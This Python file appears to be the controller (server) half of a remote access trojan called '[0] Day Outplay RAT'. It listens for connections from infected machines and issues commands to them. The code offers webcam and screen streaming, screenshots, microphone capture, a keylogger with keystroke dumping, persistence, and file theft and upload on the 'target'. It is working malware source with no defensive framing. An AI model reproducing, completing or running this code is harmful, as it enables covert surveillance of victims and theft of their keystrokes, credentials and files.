from ast import dump
import socket
import json
import os
import threading
from cv2 import recoverPose
from vidstream import StreamingServer
import platform
import base64
import sys
from vidstream import AudioReceiver





IP = "10.0.10.6"
PORT = 7007

reserved_ports = [21, 20, 22, 23, 80, 8080, 7007, 443]

cam_ports = [p for p in range(1, 65536) if p not in reserved_ports]

cam_ind = 0


sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((IP, PORT))
sock.listen(5)



def banner():
        print("""
███╗ ██████╗ ███╗    ██████╗  █████╗ ██╗   ██╗     ██████╗ ██╗   ██╗████████╗██████╗ ██╗      █████╗ ██╗   ██╗
██╔╝██╔═████╗╚██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝    ██╔═══██╗██║   ██║╚══██╔══╝██╔══██╗██║     ██╔══██╗╚██╗ ██╔╝
██║ ██║██╔██║ ██║    ██║  ██║███████║ ╚████╔╝     ██║   ██║██║   ██║   ██║   ██████╔╝██║     ███████║ ╚████╔╝ 
██║ ████╔╝██║ ██║    ██║  ██║██╔══██║  ╚██╔╝      ██║   ██║██║   ██║   ██║   ██╔═══╝ ██║     ██╔══██║  ╚██╔╝  
███╗╚██████╔╝███║    ██████╔╝██║  ██║   ██║       ╚██████╔╝╚██████╔╝   ██║   ██║     ███████╗██║  ██║   ██║   
╚══╝ ╚═════╝ ╚══╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝        ╚═════╝  ╚═════╝    ╚═╝   ╚═╝     ╚══════╝╚═╝  ╚═╝   ╚═╝   
                                                                                                                


                                        ██████╗  █████╗ ████████╗
                                        ██╔══██╗██╔══██╗╚══██╔══╝
                                        ██████╔╝███████║   ██║   
                                        ██╔══██╗██╔══██║   ██║   
                                        ██║  ██║██║  ██║   ██║   
                                        ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   
                         
        \n\n\n""")


def help():
        print(
"""
        open_cam           <==>    Open the target Camera

        close_cam          <==>    Close the target Camera

        screenshare        <==>    Share the target's screen

        screenshare_off    <==>    Close Screen Sharing

        screenshot         <==>    Screenshot the target

        persistence        <==>    Start Persistence

        start_kl           <==>    Start the KeyLogger

        stop_kl            <==>    Stop the KeyLogger

        dump_ks            <==>    Print the Captured KeyStrokes 

        save_ks            <==>    Save Captured KeyStrokes

        download [file]    <==>    Download the specified File from the target

        upload             <==>    Upload the specified File to the target

        voice_cap          <==>    Capture Voice

        voice_cap_off      <==>    Turn off Voice Capturing

        screenshot         <==>    ScreenShot the target

        sysinfo            <==>    Get the target System Informations

        Show_targets       <==>    Show your infected targets

        quit               <==>    Exit the Program
""") 



def clear_terminal():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear") 


def choose_file():
    from tkinter import Tk 
    from tkinter.filedialog import askopenfilename
    Tk().withdraw()
    return askopenfilename(title="Choose File")


def read_file(path):
    try:
        d_file = open(path, "rb")
        return base64.b64encode(d_file.read())
    except FileNotFoundError:
        return b"File Not Found !"


def write_file(file_name, content, path=""):
    try:
        d_file = open(path + file_name, "wb")
        d_file.write(base64.b64decode(content))
        d_file.close()
        return "Upload Done."
    except FileNotFoundError:
        return "Invalid Directory !"


def reliable_recv():
    json_data = ""
    while 1:
        try:
            json_data += vic_sock.recv(1024).decode().rstrip()
            return json.loads(json_data)
        except ValueError:
            continue


def reliable_send(data):
    json_data = json.dumps(data)
    vic_sock.send(json_data.encode())


def open_cam_sreen():
    cam_server.start_server()

def close_cam_screen():
    cam_server.stop_server()


def download_file(file, content):
    content = base64.b64decode(content).decode()
    location = input("\n[+] Please Enter the location to save the file in : ")
    try:
        open(location + file, "wb").write(content.encode())
        print("\n[+] File Downloaded Successfully.\n")
    except FileNotFoundError:
        print("\n[!] Invalid Location.\n")


def upload_file(file):
    try:
        u_file = open(file, "rb")
        return base64.b64encode(u_file.read()).decode()
    except FileNotFoundError:
        return "[!] File Not Found."


def dump_ks(content):
    location = input("\n[+] Enter the Filename to store KeyStrokes on it (the file will be overwritten !) : ")
    open(location+".txt", "w").write(content)
    return "[+] KeyStrokes Had Been Successfully Saved on ./" + location + ".txt"



def voice_recv():
    global recv_aud

    recv_aud = AudioReceiver(IP, 3429)
    aud_thread = threading.Thread(target=recv_aud.start_server)
    aud_thread.start()


while 1:
    banner()
    print("[+] Listening for Incomming Connecion ...")


    vic_sock, vic_addr = sock.accept()

    while 1:
        
        cmd = input("Enter Command > ").split()
        if cmd == []:
            continue
        command = cmd[0].lower()
        if command == "help":
            help()
            continue
        if command == "cls" or command == "clear":
            clear_terminal()
            continue
        if command == "open_cam":
            cam_server = StreamingServer(IP, 8888)
            open_cam_sreen()
        elif command == "screenshare":
            cam_server = StreamingServer(IP, 7890)
            open_cam_sreen()
        elif command == "upload" and len(cmd) == 1: 
            file_path = choose_file()
            filename = file_path.split("/")[-1]
            cmd.append(filename)
            content = upload_file(file_path)
            if content == "[!] File Not Found.":
                print(content)
                continue
            cmd.append(content)
        elif command == "voice_cap_off" and len(cmd) == 1:
            recv_aud.stop_server()
        elif command == "voice_cap" and len(cmd) == 1:
            voice_recv()
        reliable_send(cmd)
        if command == "close_cam" or command == "screenshare_off":
            close_cam_screen()
            
        elif command == "quit":
            print("\n[+] Bye.\n")
            sock.close()
            sys.exit()   
        elif command == "download" and len(cmd) == 2:
            recv_dwn = reliable_recv()
            if recv_dwn == "[!] File Not Found.":
                print(recv_dwn)
            else:
                download_file(cmd[1], recv_dwn)
            continue
        
        elif command == "picap" and len(cmd) == 1:
            file_path = input("[+] Enter the name of the picture : ").strip()
            write_file(file_path+".jpg", reliable_recv())
            continue
        
        response = reliable_recv()
        if command == "dump_ks" and len(cmd) == 1:
            response = dump_ks(response)
        elif command == "screenshot" and len(cmd) == 1:
            file_path = input("[+] Enter the name of the picture : ").strip()
            write_file(file_path+".jpg", response[1])
            response = "[+] Screen Successfully captured."
            
        print("\n" + response + "\n")

        if response == "[+] KeyLogger Stopped.":
            break
            
